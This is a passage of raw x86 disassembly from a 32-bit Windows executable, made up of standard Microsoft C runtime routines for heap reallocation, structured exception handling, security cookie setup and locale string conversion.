  427174:	shr    edi,cl
  427176:	mov    ecx,DWORD PTR [ebp-0x4]
  427179:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42717d:	jmp    0x4271a8
  42717f:	cmp    BYTE PTR [ebp+0xb],0x0
  427183:	jne    0x427192
  427185:	lea    ecx,[esi-0x20]
  427188:	mov    edi,0x80000000
  42718d:	shr    edi,cl
  42718f:	or     DWORD PTR [ebx+0x4],edi
  427192:	mov    ecx,DWORD PTR [ebp-0x4]
  427195:	lea    edi,[eax+ecx*4+0xc4]
  42719c:	lea    ecx,[esi-0x20]
  42719f:	mov    esi,0x80000000
  4271a4:	shr    esi,cl
  4271a6:	or     DWORD PTR [edi],esi
  4271a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ab:	test   ecx,ecx
  4271ad:	je     0x4271ba
  4271af:	mov    DWORD PTR [edx],ecx
  4271b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271b5:	jmp    0x4271ba
  4271b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ba:	mov    esi,DWORD PTR [ebp-0x10]
  4271bd:	add    edx,ecx
  4271bf:	lea    ecx,[esi+0x1]
  4271c2:	mov    DWORD PTR [edx],ecx
  4271c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271c8:	mov    esi,DWORD PTR [ebp-0xc]
  4271cb:	mov    ecx,DWORD PTR [esi]
  4271cd:	test   ecx,ecx
  4271cf:	lea    edi,[ecx+0x1]
  4271d2:	mov    DWORD PTR [esi],edi
  4271d4:	jne    0x4271f0
  4271d6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271dc:	jne    0x4271f0
  4271de:	mov    ecx,DWORD PTR [ebp-0x4]
  4271e1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271e7:	jne    0x4271f0
  4271e9:	and    DWORD PTR ds:0x45def8,0x0
  4271f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f3:	mov    DWORD PTR [eax],ecx
  4271f5:	lea    eax,[edx+0x4]
  4271f8:	pop    edi
  4271f9:	pop    esi
  4271fa:	pop    ebx
  4271fb:	leave  
  4271fc:	ret    
  4271fd:	int3   
  4271fe:	int3   
  4271ff:	int3   
  427200:	push   esi
  427201:	inc    ebx
  427202:	xor    dh,BYTE PTR [eax]
  427204:	pop    eax
  427205:	inc    ebx
  427206:	xor    BYTE PTR [eax],dh
  427208:	push   ebp
  427209:	mov    ebp,esp
  42720b:	sub    esp,0x8
  42720e:	push   ebx
  42720f:	push   esi
  427210:	push   edi
  427211:	push   ebp
  427212:	cld    
  427213:	mov    ebx,DWORD PTR [ebp+0xc]
  427216:	mov    eax,DWORD PTR [ebp+0x8]
  427219:	test   DWORD PTR [eax+0x4],0x6
  427220:	jne    0x4272a8
  427226:	mov    DWORD PTR [ebp-0x8],eax
  427229:	mov    eax,DWORD PTR [ebp+0x10]
  42722c:	mov    DWORD PTR [ebp-0x4],eax
  42722f:	lea    eax,[ebp-0x8]
  427232:	mov    DWORD PTR [ebx-0x4],eax
  427235:	mov    esi,DWORD PTR [ebx+0xc]
  427238:	mov    edi,DWORD PTR [ebx+0x8]
  42723b:	cmp    esi,0xffffffff
  42723e:	je     0x4272a1
  427240:	lea    ecx,[esi+esi*2]
  427243:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427248:	je     0x42728f
  42724a:	push   esi
  42724b:	push   ebp
  42724c:	lea    ebp,[ebx+0x10]
  42724f:	call   DWORD PTR [edi+ecx*4+0x4]
  427253:	pop    ebp
  427254:	pop    esi
  427255:	mov    ebx,DWORD PTR [ebp+0xc]
  427258:	or     eax,eax
  42725a:	je     0x42728f
  42725c:	js     0x42729a
  42725e:	mov    edi,DWORD PTR [ebx+0x8]
  427261:	push   ebx
  427262:	call   0x428190
  427267:	add    esp,0x4
  42726a:	lea    ebp,[ebx+0x10]
  42726d:	push   esi
  42726e:	push   ebx
  42726f:	call   0x4281d2
  427274:	add    esp,0x8
  427277:	lea    ecx,[esi+esi*2]
  42727a:	push   0x1
  42727c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427280:	call   0x428266
  427285:	mov    eax,DWORD PTR [edi+ecx*4]
  427288:	mov    DWORD PTR [ebx+0xc],eax
  42728b:	call   DWORD PTR [edi+ecx*4+0x8]
  42728f:	mov    edi,DWORD PTR [ebx+0x8]
  427292:	lea    ecx,[esi+esi*2]
  427295:	mov    esi,DWORD PTR [edi+ecx*4]
  427298:	jmp    0x42723b
  42729a:	mov    eax,0x0
  42729f:	jmp    0x4272bd
  4272a1:	mov    eax,0x1
  4272a6:	jmp    0x4272bd
  4272a8:	push   ebp
  4272a9:	lea    ebp,[ebx+0x10]
  4272ac:	push   0xffffffff
  4272ae:	push   ebx
  4272af:	call   0x4281d2
  4272b4:	add    esp,0x8
  4272b7:	pop    ebp
  4272b8:	mov    eax,0x1
  4272bd:	pop    ebp
  4272be:	pop    edi
  4272bf:	pop    esi
  4272c0:	pop    ebx
  4272c1:	mov    esp,ebp
  4272c3:	pop    ebp
  4272c4:	ret    
  4272c5:	push   ebp
  4272c6:	mov    ecx,DWORD PTR [esp+0x8]
  4272ca:	mov    ebp,DWORD PTR [ecx]
  4272cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272cf:	push   eax
  4272d0:	mov    eax,DWORD PTR [ecx+0x18]
  4272d3:	push   eax
  4272d4:	call   0x4281d2
  4272d9:	add    esp,0x8
  4272dc:	pop    ebp
  4272dd:	ret    0x4
  4272e0:	call   0x4251f3
  4272e5:	add    eax,0x8
  4272e8:	ret    
  4272e9:	push   0x14
  4272eb:	push   0x429878
  4272f0:	call   0x425340
  4272f5:	mov    edi,DWORD PTR [ebp+0x8]
  4272f8:	xor    ebx,ebx
  4272fa:	cmp    edi,ebx
  4272fc:	jne    0x42730c
  4272fe:	push   DWORD PTR [ebp+0xc]
  427301:	call   0x426062
  427306:	pop    ecx
  427307:	jmp    0x427490
  42730c:	mov    esi,DWORD PTR [ebp+0xc]
  42730f:	cmp    esi,ebx
  427311:	jne    0x42731f
  427313:	push   edi
  427314:	call   0x425f4a
  427319:	pop    ecx
  42731a:	jmp    0x42748e
  42731f:	cmp    DWORD PTR ds:0x45e144,0x3
  427326:	jne    0x42745a
  42732c:	mov    DWORD PTR [ebp-0x1c],ebx
  42732f:	cmp    esi,0xffffffe0
  427332:	ja     0x427429
  427338:	push   0x4
  42733a:	call   0x4254ff
  42733f:	pop    ecx
  427340:	mov    DWORD PTR [ebp-0x4],ebx
  427343:	push   edi
  427344:	call   0x426722
  427349:	pop    ecx
  42734a:	mov    DWORD PTR [ebp-0x20],eax
  42734d:	cmp    eax,ebx
  42734f:	je     0x4273f9
  427355:	cmp    esi,DWORD PTR ds:0x45df04
  42735b:	ja     0x4273a9
  42735d:	push   esi
  42735e:	push   edi
  42735f:	push   eax
  427360:	call   0x426c22
  427365:	add    esp,0xc
  427368:	test   eax,eax
  42736a:	je     0x427371
  42736c:	mov    DWORD PTR [ebp-0x1c],edi
  42736f:	jmp    0x4273a9
  427371:	push   esi
  427372:	call   0x426f01
  427377:	pop    ecx
  427378:	mov    DWORD PTR [ebp-0x1c],eax
  42737b:	cmp    eax,ebx
  42737d:	je     0x4273a9
  42737f:	mov    eax,DWORD PTR [edi-0x4]
  427382:	dec    eax
  427383:	mov    DWORD PTR [ebp-0x24],eax
  427386:	cmp    eax,esi
  427388:	jb     0x42738c
  42738a:	mov    eax,esi
  42738c:	push   eax
  42738d:	push   edi
  42738e:	push   DWORD PTR [ebp-0x1c]
  427391:	call   0x426080
  427396:	push   edi
  427397:	call   0x426722
  42739c:	mov    DWORD PTR [ebp-0x20],eax
  42739f:	push   edi
  4273a0:	push   eax
  4273a1:	call   0x42674d
  4273a6:	add    esp,0x18
  4273a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273ac:	jne    0x4273f9
  4273ae:	cmp    esi,ebx
  4273b0:	jne    0x4273b8
  4273b2:	xor    esi,esi
  4273b4:	inc    esi
  4273b5:	mov    DWORD PTR [ebp+0xc],esi
  4273b8:	add    esi,0xf
  4273bb:	and    esi,0xfffffff0
  4273be:	mov    DWORD PTR [ebp+0xc],esi
  4273c1:	push   esi
  4273c2:	push   ebx
  4273c3:	push   DWORD PTR ds:0x45e140
  4273c9:	call   DWORD PTR ds:0x429030
  4273cf:	mov    DWORD PTR [ebp-0x1c],eax
  4273d2:	cmp    eax,ebx
  4273d4:	je     0x4273f9
  4273d6:	mov    eax,DWORD PTR [edi-0x4]
  4273d9:	dec    eax
  4273da:	mov    DWORD PTR [ebp-0x24],eax
  4273dd:	cmp    eax,esi
  4273df:	jb     0x4273e3
  4273e1:	mov    eax,esi
  4273e3:	push   eax
  4273e4:	push   edi
  4273e5:	push   DWORD PTR [ebp-0x1c]
  4273e8:	call   0x426080
  4273ed:	push   edi
  4273ee:	push   DWORD PTR [ebp-0x20]
  4273f1:	call   0x42674d
  4273f6:	add    esp,0x14
  4273f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4273fd:	call   0x427451
  427402:	cmp    DWORD PTR [ebp-0x20],ebx
  427405:	jne    0x427429
  427407:	cmp    esi,ebx
  427409:	jne    0x42740e
  42740b:	xor    esi,esi
  42740d:	inc    esi
  42740e:	add    esi,0xf
  427411:	and    esi,0xfffffff0
  427414:	mov    DWORD PTR [ebp+0xc],esi
  427417:	push   esi
  427418:	push   edi
  427419:	push   ebx
  42741a:	push   DWORD PTR ds:0x45e140
  427420:	call   DWORD PTR ds:0x4290d0
  427426:	mov    DWORD PTR [ebp-0x1c],eax
  427429:	mov    eax,DWORD PTR [ebp-0x1c]
  42742c:	cmp    eax,ebx
  42742e:	jne    0x427490
  427430:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427436:	je     0x427490
  427438:	push   esi
  427439:	call   0x427c22
  42743e:	pop    ecx
  42743f:	test   eax,eax
  427441:	jne    0x42732c
  427447:	jmp    0x42748e
  427449:	xor    ebx,ebx
  42744b:	mov    esi,DWORD PTR [ebp+0xc]
  42744e:	mov    edi,DWORD PTR [ebp+0x8]
  427451:	push   0x4
  427453:	call   0x42546b
  427458:	pop    ecx
  427459:	ret    
  42745a:	xor    eax,eax
  42745c:	cmp    esi,0xffffffe0
  42745f:	ja     0x427477
  427461:	cmp    esi,ebx
  427463:	jne    0x427468
  427465:	xor    esi,esi
  427467:	inc    esi
  427468:	push   esi
  427469:	push   edi
  42746a:	push   ebx
  42746b:	push   DWORD PTR ds:0x45e140
  427471:	call   DWORD PTR ds:0x4290d0
  427477:	cmp    eax,ebx
  427479:	jne    0x427490
  42747b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427481:	je     0x427490
  427483:	push   esi
  427484:	call   0x427c22
  427489:	pop    ecx
  42748a:	test   eax,eax
  42748c:	jne    0x42745a
  42748e:	xor    eax,eax
  427490:	call   0x42537b
  427495:	ret    
  427496:	push   0x10
  427498:	push   0x429888
  42749d:	call   0x425340
  4274a2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274a9:	jne    0x4274e5
  4274ab:	push   0x4
  4274ad:	call   0x4254ff
  4274b2:	pop    ecx
  4274b3:	and    DWORD PTR [ebp-0x4],0x0
  4274b7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ba:	push   esi
  4274bb:	call   0x426722
  4274c0:	pop    ecx
  4274c1:	mov    DWORD PTR [ebp-0x1c],eax
  4274c4:	test   eax,eax
  4274c6:	je     0x4274d3
  4274c8:	mov    esi,DWORD PTR [esi-0x4]
  4274cb:	sub    esi,0x9
  4274ce:	mov    DWORD PTR [ebp-0x20],esi
  4274d1:	jmp    0x4274d6
  4274d3:	mov    esi,DWORD PTR [ebp-0x20]
  4274d6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274da:	call   0x427503
  4274df:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274e3:	jne    0x4274f8
  4274e5:	push   DWORD PTR [ebp+0x8]
  4274e8:	push   0x0
  4274ea:	push   DWORD PTR ds:0x45e140
  4274f0:	call   DWORD PTR ds:0x4290d4
  4274f6:	mov    esi,eax
  4274f8:	mov    eax,esi
  4274fa:	call   0x42537b
  4274ff:	ret    
  427500:	mov    esi,DWORD PTR [ebp-0x20]
  427503:	push   0x4
  427505:	call   0x42546b
  42750a:	pop    ecx
  42750b:	ret    
  42750c:	push   ebp
  42750d:	mov    ebp,esp
  42750f:	sub    esp,0x10
  427512:	push   esi
  427513:	lea    eax,[ebp-0x8]
  427516:	push   eax
  427517:	call   DWORD PTR ds:0x4290e4
  42751d:	mov    esi,DWORD PTR [ebp-0x4]
  427520:	xor    esi,DWORD PTR [ebp-0x8]
  427523:	call   DWORD PTR ds:0x4290e0
  427529:	xor    esi,eax
  42752b:	call   DWORD PTR ds:0x429098
  427531:	xor    esi,eax
  427533:	call   DWORD PTR ds:0x4290dc
  427539:	xor    esi,eax
  42753b:	lea    eax,[ebp-0x10]
  42753e:	push   eax
  42753f:	call   DWORD PTR ds:0x4290d8
  427545:	mov    eax,DWORD PTR [ebp-0xc]
  427548:	xor    eax,DWORD PTR [ebp-0x10]
  42754b:	xor    esi,eax
  42754d:	mov    DWORD PTR ds:0x45d430,esi
  427553:	jne    0x42755f
  427555:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42755f:	pop    esi
  427560:	leave  
  427561:	ret    
  427562:	push   0x118
  427567:	push   0x429a38
  42756c:	call   0x425340
  427571:	mov    eax,ds:0x45d430
  427576:	xor    eax,DWORD PTR [ebp+0x4]
  427579:	mov    DWORD PTR [ebp-0x1c],eax
  42757c:	mov    eax,ds:0x45dd98
  427581:	xor    ecx,ecx
  427583:	cmp    eax,ecx
  427585:	je     0x4275a6
  427587:	mov    DWORD PTR [ebp-0x4],ecx
  42758a:	push   DWORD PTR [ebp+0xc]
  42758d:	push   DWORD PTR [ebp+0x8]
  427590:	call   eax
  427592:	pop    ecx
  427593:	pop    ecx
  427594:	or     DWORD PTR [ebp-0x4],0xffffffff
  427598:	jmp    0x4276a4
  42759d:	xor    eax,eax
  42759f:	inc    eax
  4275a0:	ret    
  4275a1:	mov    esp,DWORD PTR [ebp-0x18]
  4275a4:	jmp    0x427594
  4275a6:	mov    eax,DWORD PTR [ebp+0x8]
  4275a9:	dec    eax
  4275aa:	je     0x4275bf
  4275ac:	mov    edi,0x429a14
  4275b1:	mov    DWORD PTR [ebp-0x20],0x429960
  4275b8:	mov    esi,0xd4
  4275bd:	jmp    0x4275d0
  4275bf:	mov    edi,0x429940
  4275c4:	mov    DWORD PTR [ebp-0x20],0x4298a0
  4275cb:	mov    esi,0xb9
  4275d0:	mov    BYTE PTR [ebp-0x24],cl
  4275d3:	push   0x104
  4275d8:	lea    eax,[ebp-0x128]
  4275de:	push   eax
  4275df:	push   ecx
  4275e0:	call   DWORD PTR ds:0x429068
  4275e6:	test   eax,eax
  4275e8:	jne    0x4275fd
  4275ea:	push   0x429594
  4275ef:	lea    eax,[ebp-0x128]
  4275f5:	push   eax
  4275f6:	call   0x425720
  4275fb:	pop    ecx
  4275fc:	pop    ecx
  4275fd:	lea    ebx,[ebp-0x128]
  427603:	lea    eax,[ebp-0x128]
  427609:	push   eax
  42760a:	call   0x425950
  42760f:	pop    ecx
  427610:	add    eax,0xb
  427613:	cmp    eax,0x3c
  427616:	jbe    0x427641
  427618:	lea    eax,[ebp-0x128]
  42761e:	push   eax
  42761f:	call   0x425950
  427624:	mov    ebx,eax
  427626:	lea    eax,[ebp-0x128]
  42762c:	sub    eax,0x31
  42762f:	add    ebx,eax
  427631:	push   0x3
  427633:	push   0x429590
  427638:	push   ebx
  427639:	call   0x425820
  42763e:	add    esp,0x10
  427641:	push   ebx
  427642:	call   0x425950
  427647:	pop    ecx
  427648:	lea    eax,[eax+esi*1+0xc]
  42764c:	add    eax,0x3
  42764f:	and    eax,0xfffffffc
  427652:	call   0x425390
  427657:	mov    DWORD PTR [ebp-0x18],esp
  42765a:	mov    esi,esp
  42765c:	push   edi
  42765d:	push   esi
  42765e:	call   0x425720
  427663:	mov    edi,0x429570
  427668:	push   edi
  427669:	push   esi
  42766a:	call   0x425730
  42766f:	push   0x429894
  427674:	push   esi
  427675:	call   0x425730
  42767a:	push   ebx
  42767b:	push   esi
  42767c:	call   0x425730
  427681:	push   edi
  427682:	push   esi
  427683:	call   0x425730
  427688:	push   DWORD PTR [ebp-0x20]
  42768b:	push   esi
  42768c:	call   0x425730
  427691:	push   0x12010
  427696:	push   0x429548
  42769b:	push   esi
  42769c:	call   0x425622
  4276a1:	add    esp,0x3c
  4276a4:	push   0x3
  4276a6:	call   0x4247ac
  4276ab:	int3   
  4276ac:	push   0x38
  4276ae:	push   0x429e58
  4276b3:	call   0x425340
  4276b8:	xor    ebx,ebx
  4276ba:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276c0:	jne    0x4276fa
  4276c2:	push   ebx
  4276c3:	push   ebx
  4276c4:	xor    esi,esi
  4276c6:	inc    esi
  4276c7:	push   esi
  4276c8:	push   0x429e54
  4276cd:	push   0x100
  4276d2:	push   ebx
  4276d3:	call   DWORD PTR ds:0x4290f0
  4276d9:	test   eax,eax
  4276db:	je     0x4276e5
  4276dd:	mov    DWORD PTR ds:0x45ddbc,esi
  4276e3:	jmp    0x4276fa
  4276e5:	call   DWORD PTR ds:0x429044
  4276eb:	cmp    eax,0x78
  4276ee:	jne    0x4276fa
  4276f0:	mov    DWORD PTR ds:0x45ddbc,0x2
  4276fa:	cmp    DWORD PTR [ebp+0x14],ebx
  4276fd:	jle    0x42771a
  4276ff:	mov    ecx,DWORD PTR [ebp+0x14]
  427702:	mov    eax,DWORD PTR [ebp+0x10]
  427705:	dec    ecx
  427706:	cmp    BYTE PTR [eax],bl
  427708:	je     0x427712
  42770a:	inc    eax
  42770b:	cmp    ecx,ebx
  42770d:	jne    0x427705
  42770f:	or     ecx,0xffffffff
  427712:	or     eax,0xffffffff
  427715:	sub    eax,ecx
  427717:	add    DWORD PTR [ebp+0x14],eax
  42771a:	mov    eax,ds:0x45ddbc
  42771f:	cmp    eax,0x2
  427722:	je     0x427904
  427728:	cmp    eax,ebx
  42772a:	je     0x427904
  427730:	cmp    eax,0x1
  427733:	jne    0x427937
  427739:	xor    edi,edi
  42773b:	mov    DWORD PTR [ebp-0x1c],edi
  42773e:	mov    DWORD PTR [ebp-0x20],ebx
  427741:	mov    DWORD PTR [ebp-0x24],ebx
  427744:	cmp    DWORD PTR [ebp+0x20],ebx
  427747:	jne    0x427751
  427749:	mov    eax,ds:0x45ddb4
  42774e:	mov    DWORD PTR [ebp+0x20],eax
  427751:	push   ebx
  427752:	push   ebx
  427753:	push   DWORD PTR [ebp+0x14]
  427756:	push   DWORD PTR [ebp+0x10]
  427759:	xor    eax,eax
  42775b:	cmp    DWORD PTR [ebp+0x24],ebx
  42775e:	setne  al
  427761:	lea    eax,[eax*8+0x1]
  427768:	push   eax
  427769:	push   DWORD PTR [ebp+0x20]
  42776c:	call   DWORD PTR ds:0x4290ec
  427772:	mov    esi,eax
  427774:	mov    DWORD PTR [ebp-0x28],esi
  427777:	cmp    esi,ebx
  427779:	je     0x427937
  42777f:	mov    DWORD PTR [ebp-0x4],0x1
  427786:	lea    eax,[esi+esi*1]
  427789:	add    eax,0x3
  42778c:	and    eax,0xfffffffc
  42778f:	call   0x425390
  427794:	mov    DWORD PTR [ebp-0x18],esp
  427797:	mov    eax,esp
  427799:	mov    DWORD PTR [ebp-0x2c],eax
  42779c:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277a0:	jmp    0x4277bd
  4277a2:	xor    eax,eax
  4277a4:	inc    eax
  4277a5:	ret    
  4277a6:	mov    esp,DWORD PTR [ebp-0x18]
  4277a9:	call   0x4287d5
  4277ae:	xor    ebx,ebx
  4277b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277b3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ba:	mov    esi,DWORD PTR [ebp-0x28]
  4277bd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277c0:	jne    0x4277de
  4277c2:	lea    eax,[esi+esi*1]
  4277c5:	push   eax
  4277c6:	call   0x426062
  4277cb:	pop    ecx
  4277cc:	mov    DWORD PTR [ebp-0x2c],eax
  4277cf:	cmp    eax,ebx
  4277d1:	je     0x427937
  4277d7:	mov    DWORD PTR [ebp-0x20],0x1
  4277de:	push   esi
  4277df:	push   DWORD PTR [ebp-0x2c]
  4277e2:	push   DWORD PTR [ebp+0x14]
  4277e5:	push   DWORD PTR [ebp+0x10]
  4277e8:	push   0x1
  4277ea:	push   DWORD PTR [ebp+0x20]
  4277ed:	call   DWORD PTR ds:0x4290ec
  4277f3:	test   eax,eax
  4277f5:	je     0x4278e1
  4277fb:	push   ebx
  4277fc:	push   ebx
  4277fd:	push   esi
  4277fe:	push   DWORD PTR [ebp-0x2c]
  427801:	push   DWORD PTR [ebp+0xc]
  427804:	push   DWORD PTR [ebp+0x8]
  427807:	call   DWORD PTR ds:0x4290f0
  42780d:	mov    edi,eax
  42780f:	mov    DWORD PTR [ebp-0x1c],edi
  427812:	cmp    edi,ebx
  427814:	je     0x4278e1
  42781a:	test   BYTE PTR [ebp+0xd],0x4
  42781e:	je     0x42784d
  427820:	cmp    DWORD PTR [ebp+0x1c],ebx
  427823:	je     0x4278e1
  427829:	cmp    edi,DWORD PTR [ebp+0x1c]
  42782c:	jg     0x4278e1
  427832:	push   DWORD PTR [ebp+0x1c]
  427835:	push   DWORD PTR [ebp+0x18]
  427838:	push   esi
  427839:	push   DWORD PTR [ebp-0x2c]
  42783c:	push   DWORD PTR [ebp+0xc]
  42783f:	push   DWORD PTR [ebp+0x8]
  427842:	call   DWORD PTR ds:0x4290f0
  427848:	jmp    0x4278e1
  42784d:	mov    DWORD PTR [ebp-0x4],0x2
  427854:	lea    eax,[edi+edi*1]
  427857:	add    eax,0x3
  42785a:	and    eax,0xfffffffc
  42785d:	call   0x425390
  427862:	mov    DWORD PTR [ebp-0x18],esp
  427865:	mov    eax,esp
  427867:	mov    DWORD PTR [ebp-0x30],eax
  42786a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42786e:	jmp    0x42788b
  427870:	xor    eax,eax
  427872:	inc    eax
  427873:	ret    
  427874:	mov    esp,DWORD PTR [ebp-0x18]
  427877:	call   0x4287d5
  42787c:	xor    ebx,ebx
  42787e:	mov    DWORD PTR [ebp-0x30],ebx
  427881:	or     DWORD PTR [ebp-0x4],0xffffffff
  427885:	mov    edi,DWORD PTR [ebp-0x1c]
  427888:	mov    esi,DWORD PTR [ebp-0x28]
  42788b:	cmp    DWORD PTR [ebp-0x30],ebx
  42788e:	jne    0x4278a8
  427890:	lea    eax,[edi+edi*1]
  427893:	push   eax
  427894:	call   0x426062
  427899:	pop    ecx
  42789a:	mov    DWORD PTR [ebp-0x30],eax
  42789d:	cmp    eax,ebx
  42789f:	je     0x4278e1
  4278a1:	mov    DWORD PTR [ebp-0x24],0x1
  4278a8:	push   edi
  4278a9:	push   DWORD PTR [ebp-0x30]
  4278ac:	push   esi
  4278ad:	push   DWORD PTR [ebp-0x2c]
  4278b0:	push   DWORD PTR [ebp+0xc]
  4278b3:	push   DWORD PTR [ebp+0x8]
  4278b6:	call   DWORD PTR ds:0x4290f0
  4278bc:	test   eax,eax
  4278be:	je     0x4278e1
  4278c0:	push   ebx
  4278c1:	push   ebx
  4278c2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278c5:	jne    0x4278cb
  4278c7:	push   ebx
  4278c8:	push   ebx
  4278c9:	jmp    0x4278d1
  4278cb:	push   DWORD PTR [ebp+0x1c]
  4278ce:	push   DWORD PTR [ebp+0x18]
  4278d1:	push   edi
  4278d2:	push   DWORD PTR [ebp-0x30]
  4278d5:	push   ebx
  4278d6:	push   DWORD PTR [ebp+0x20]
  4278d9:	call   DWORD PTR ds:0x42907c
  4278df:	mov    edi,eax
  4278e1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278e4:	je     0x4278ef
  4278e6:	push   DWORD PTR [ebp-0x30]
  4278e9:	call   0x425f4a
  4278ee:	pop    ecx
  4278ef:	cmp    DWORD PTR [ebp-0x20],ebx
  4278f2:	je     0x4278fd
  4278f4:	push   DWORD PTR [ebp-0x2c]
  4278f7:	call   0x425f4a
  4278fc:	pop    ecx
  4278fd:	mov    eax,edi
  4278ff:	jmp    0x427a5f
  427904:	mov    DWORD PTR [ebp-0x34],ebx
  427907:	xor    edi,edi
  427909:	mov    DWORD PTR [ebp-0x38],ebx
  42790c:	cmp    DWORD PTR [ebp+0x8],ebx
  42790f:	jne    0x427919
  427911:	mov    eax,ds:0x45dda4
  427916:	mov    DWORD PTR [ebp+0x8],eax
  427919:	cmp    DWORD PTR [ebp+0x20],ebx
  42791c:	jne    0x427926
  42791e:	mov    eax,ds:0x45ddb4
  427923:	mov    DWORD PTR [ebp+0x20],eax
  427926:	push   DWORD PTR [ebp+0x8]
  427929:	call   0x4285bd
  42792e:	pop    ecx
  42792f:	mov    DWORD PTR [ebp-0x3c],eax
  427932:	cmp    eax,0xffffffff
  427935:	jne    0x42793e
  427937:	xor    eax,eax
  427939:	jmp    0x427a5f
  42793e:	cmp    eax,DWORD PTR [ebp+0x20]
  427941:	je     0x427a35
  427947:	push   ebx
  427948:	push   ebx
  427949:	lea    ecx,[ebp+0x14]
  42794c:	push   ecx
  42794d:	push   DWORD PTR [ebp+0x10]
  427950:	push   eax
  427951:	push   DWORD PTR [ebp+0x20]
  427954:	call   0x428606
  427959:	add    esp,0x18
  42795c:	mov    DWORD PTR [ebp-0x34],eax
  42795f:	cmp    eax,ebx
  427961:	je     0x427937
  427963:	push   ebx
  427964:	push   ebx
  427965:	push   DWORD PTR [ebp+0x14]
  427968:	push   eax
  427969:	push   DWORD PTR [ebp+0xc]
  42796c:	push   DWORD PTR [ebp+0x8]
  42796f:	call   DWORD PTR ds:0x4290e8
  427975:	mov    esi,eax
  427977:	mov    DWORD PTR [ebp-0x40],esi
  42797a:	cmp    esi,ebx
  42797c:	je     0x427a24
  427982:	mov    DWORD PTR [ebp-0x4],ebx
  427985:	add    eax,0x3
  427988:	and    eax,0xfffffffc
  42798b:	call   0x425390
  427990:	mov    DWORD PTR [ebp-0x18],esp
  427993:	mov    edi,esp
  427995:	mov    DWORD PTR [ebp-0x44],edi
  427998:	push   esi
  427999:	push   ebx
  42799a:	push   edi
  42799b:	call   0x427c40
  4279a0:	add    esp,0xc
  4279a3:	jmp    0x4279b5
  4279a5:	xor    eax,eax
  4279a7:	inc    eax
  4279a8:	ret    
  4279a9:	mov    esp,DWORD PTR [ebp-0x18]
  4279ac:	call   0x4287d5
  4279b1:	xor    ebx,ebx
  4279b3:	xor    edi,edi
  4279b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279b9:	cmp    edi,ebx
  4279bb:	jne    0x4279e0
  4279bd:	push   DWORD PTR [ebp-0x40]
  4279c0:	call   0x426062
  4279c5:	pop    ecx
  4279c6:	mov    edi,eax
  4279c8:	cmp    edi,ebx
  4279ca:	je     0x4279fd
  4279cc:	push   DWORD PTR [ebp-0x40]
  4279cf:	push   ebx
  4279d0:	push   edi
  4279d1:	call   0x427c40
  4279d6:	add    esp,0xc
  4279d9:	mov    DWORD PTR [ebp-0x38],0x1
  4279e0:	push   DWORD PTR [ebp-0x40]
  4279e3:	push   edi
  4279e4:	push   DWORD PTR [ebp+0x14]
  4279e7:	push   DWORD PTR [ebp-0x34]
  4279ea:	push   DWORD PTR [ebp+0xc]
  4279ed:	push   DWORD PTR [ebp+0x8]
  4279f0:	call   DWORD PTR ds:0x4290e8
  4279f6:	mov    DWORD PTR [ebp-0x40],eax
  4279f9:	cmp    eax,ebx
  4279fb:	jne    0x427a01
  4279fd:	xor    esi,esi
  4279ff:	jmp    0x427a27
  427a01:	push   DWORD PTR [ebp+0x1c]
  427a04:	push   DWORD PTR [ebp+0x18]
  427a07:	lea    eax,[ebp-0x40]
  427a0a:	push   eax
  427a0b:	push   edi
  427a0c:	push   DWORD PTR [ebp+0x20]
  427a0f:	push   DWORD PTR [ebp-0x3c]
  427a12:	call   0x428606
  427a17:	add    esp,0x18
  427a1a:	mov    esi,eax
  427a1c:	neg    esi
  427a1e:	sbb    esi,esi
  427a20:	neg    esi
  427a22:	jmp    0x427a27
  427a24:	mov    esi,DWORD PTR [ebp-0x48]
  427a27:	cmp    DWORD PTR [ebp-0x38],ebx
  427a2a:	je     0x427a4f
  427a2c:	push   edi
  427a2d:	call   0x425f4a
  427a32:	pop    ecx
  427a33:	jmp    0x427a4f
  427a35:	push   DWORD PTR [ebp+0x1c]
  427a38:	push   DWORD PTR [ebp+0x18]
  427a3b:	push   DWORD PTR [ebp+0x14]
  427a3e:	push   DWORD PTR [ebp+0x10]
  427a41:	push   DWORD PTR [ebp+0xc]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	call   DWORD PTR ds:0x4290e8
  427a4d:	mov    esi,eax
  427a4f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a52:	je     0x427a5d
  427a54:	push   DWORD PTR [ebp-0x34]
  427a57:	call   0x425f4a
  427a5c:	pop    ecx
  427a5d:	mov    eax,esi
  427a5f:	lea    esp,[ebp-0x54]
  427a62:	call   0x42537b
  427a67:	ret    
  427a68:	push   0x1c
  427a6a:	push   0x429e80
  427a6f:	call   0x425340
  427a74:	xor    esi,esi
  427a76:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a7c:	jne    0x427ab3
  427a7e:	lea    eax,[ebp-0x1c]
  427a81:	push   eax
  427a82:	xor    edi,edi
  427a84:	inc    edi
  427a85:	push   edi
  427a86:	push   0x429e54
